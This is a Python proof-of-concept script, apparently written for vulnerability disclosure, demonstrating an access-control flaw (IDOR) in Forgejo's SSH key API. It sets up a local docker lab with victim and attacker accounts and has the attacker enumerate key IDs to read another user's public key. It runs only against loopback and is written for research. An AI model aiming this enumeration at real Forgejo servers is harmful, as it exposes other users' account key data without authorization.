#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: forgejo-keys-idor (High: 7.5)
#  Vendor: Forgejo (Forgejo)
#  Versions: Forgejo <= 16.0.5
#  Impact: Authenticated IDOR (SSH / Deploy Key Disclosure)
#  Requires: authenticated GET /api/v1/user/keys/{id}
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "forgejo-keys-idor"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only lab: Forgejo GET /api/v1/user/keys/{id} IDOR on v16.0.5.

GetPublicKeyByID loads public_key by numeric ID with no owner check. An
authenticated attacker walks sequential IDs and reads another user's SSH
public key title and material. Oracle is HTTP 200 plus the witness title.
Loopback only. No private keys, shells, or payloads.
"""


import base64
import json
import os
import secrets
import struct
import subprocess
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "forgejo-keys-idor"
WITNESS = "FORGEJO-KEYS-IDOR-WITNESS"
DEFAULT_BASE = "http://127.0.0.1:19310"
COMPOSE_PROJECT = "forgejo-keys-idor"
SERVICE = "forgejo"
USER_AGENT = "forgejo-keys-idor-lab"
HTTP_TIMEOUT_S = 30
KEY_ID_MIN = 1
KEY_ID_MAX_EXCLUSIVE = 32
PASSWORD = "LabPassw0rd!"
VICTIM_USER = "victim"
ATTACKER_USER = "attacker"
ATTACKER_TITLE = "attacker-own-key"
HERE = Path(__file__).resolve().parent


@dataclass(frozen=True)
class Config:
    base: str
    compose: str
    attacker: tuple[str, str]
    victim: tuple[str, str]


def fail(reason: str) -> int:
    print(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def load_config(argv: list[str]) -> Config:
    base = (argv[1] if len(argv) > 1 else DEFAULT_BASE).rstrip("/")
    compose = os.environ.get("COMPOSE_PROJECT_NAME", COMPOSE_PROJECT)
    return Config(
        base=base,
        compose=compose,
        attacker=(ATTACKER_USER, PASSWORD),
        victim=(VICTIM_USER, PASSWORD),
    )


def openssh_ed25519_pub(material: bytes, comment: str) -> str:
    if len(material) != 32:
        raise ValueError("ed25519 public key is 32 bytes")
    algo = b"ssh-ed25519"
    blob = struct.pack(">I", len(algo)) + algo + struct.pack(">I", 32) + material
    return f"ssh-ed25519 {base64.b64encode(blob).decode('ascii')} {comment}"


def request(
    cfg: Config,
    method: str,
    path: str,
    data: dict[str, Any] | None = None,
    auth: tuple[str, str] | None = None,
) -> tuple[int, str]:
    headers = {"Content-Type": "application/json", "User-Agent": USER_AGENT}
    if auth is not None:
        token = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode("ascii")
        headers["Authorization"] = "Basic " + token
    body = None if data is None else json.dumps(data).encode("utf-8")
    req = urllib.request.Request(cfg.base + path, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT_S) as resp:
            return int(resp.status), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", "replace")


def create_user(cfg: Config, username: str, email: str) -> None:
    cmd = [
        "docker",
        "compose",
        "-p",
        cfg.compose,
        "exec",
        "-T",
        "-u",
        "git",
        SERVICE,
        "forgejo",
        "admin",
        "user",
        "create",
        "--username",
        username,
        "--password",
        PASSWORD,
        "--email",
        email,
        "--must-change-password=false",
    ]
    proc = subprocess.run(
        cmd,
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    combined = f"{proc.stdout} {proc.stderr}".strip()
    snippet = combined.replace("\n", " ")[:200]
    print(f"IOC user-create user={username} rc={proc.returncode} snippet={snippet!r}")
    if proc.returncode == 0:
        return
    lower = combined.lower()
    if "already" in lower or "exist" in lower or "duplicate" in lower:
        return
    raise RuntimeError(f"create user {username} failed rc={proc.returncode}")


def add_key(cfg: Config, user: tuple[str, str], title: str, pub: str) -> int:
    status, body = request(cfg, "GET", "/api/v1/user/keys", auth=user)
    if status == 200 and title in body:
        entries = json.loads(body)
        for entry in entries:
            if entry.get("title") == title:
                key_id = int(entry["id"])
                print(f"IOC key-exists user={user[0]} id={key_id}")
                return key_id
    payload = {"title": title, "key": pub.strip()}
    status, body = request(cfg, "POST", "/api/v1/user/keys", data=payload, auth=user)
    print(f"IOC add-key user={user[0]} status={status} snippet={body[:180]!r}")
    if status not in (200, 201):
        raise RuntimeError(f"add key {user[0]} status={status}")
    return int(json.loads(body)["id"])


def main() -> int:
    cfg = load_config(sys.argv)
    print(f"IOC base={cfg.base} compose={cfg.compose}")

    status, body = request(cfg, "GET", "/api/v1/version")
    print(f"IOC version status={status} snippet={body[:120]!r}")
    if status != 200:
        return fail(f"version-http={status}")

    try:
        create_user(cfg, VICTIM_USER, "victim@localhost.invalid")
        create_user(cfg, ATTACKER_USER, "attacker@localhost.invalid")
    except RuntimeError as exc:
        return fail(str(exc))

    victim_pub = openssh_ed25519_pub(secrets.token_bytes(32), WITNESS)
    attacker_pub = openssh_ed25519_pub(secrets.token_bytes(32), ATTACKER_TITLE)
    try:
        victim_id = add_key(cfg, cfg.victim, WITNESS, victim_pub)
        attacker_id = add_key(cfg, cfg.attacker, ATTACKER_TITLE, attacker_pub)
    except RuntimeError as exc:
        return fail(str(exc))
    print(f"IOC planted victim-id={victim_id} attacker-id={attacker_id}")

    own_status, own_body = request(cfg, "GET", "/api/v1/user/keys", auth=cfg.attacker)
    print(f"IOC attacker-list status={own_status} snippet={own_body[:180]!r}")
    if own_status != 200:
        return fail("attacker cannot list own keys")
    if WITNESS in own_body:
        return fail("witness already in attacker key list")

    own_ids = {int(entry["id"]) for entry in json.loads(own_body)}
    if victim_id in own_ids:
        return fail("victim key id listed on attacker GET /user/keys")

    hit: tuple[int, str] | None = None
    for key_id in range(KEY_ID_MIN, KEY_ID_MAX_EXCLUSIVE):
        status, body = request(cfg, "GET", f"/api/v1/user/keys/{key_id}", auth=cfg.attacker)
        print(f"IOC get id={key_id} status={status} snippet={body[:160]!r}")
        if status == 200 and WITNESS in body:
            hit = (key_id, body)
            break
    if hit is None:
        return fail("no foreign key with witness")

    kid, hit_body = hit
    if kid in own_ids:
        return fail("hit id belongs to attacker")
    if kid != victim_id:
        return fail(f"witness-id={kid} expected={victim_id}")

    payload = json.loads(hit_body)
    title = str(payload.get("title", ""))
    key_blob = str(payload.get("key", ""))
    if title != WITNESS:
        return fail(f"title={title!r}")
    if not key_blob:
        return fail("empty key blob")
    if payload.get("user") is not None:
        return fail("private user field leaked to non-owner")

    gpg_status, gpg_body = request(cfg, "GET", f"/api/v1/user/gpg_keys/{kid}", auth=cfg.attacker)
    print(f"IOC gpg-neg id={kid} status={gpg_status} snippet={gpg_body[:120]!r}")
    if gpg_status != 404:
        return fail(f"gpg-neg-http={gpg_status}")

    print(
        f"SUCCESS {LABEL} victim-id={kid} get-http=200 list-has-id=no "
        f"gpg-http=404 {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

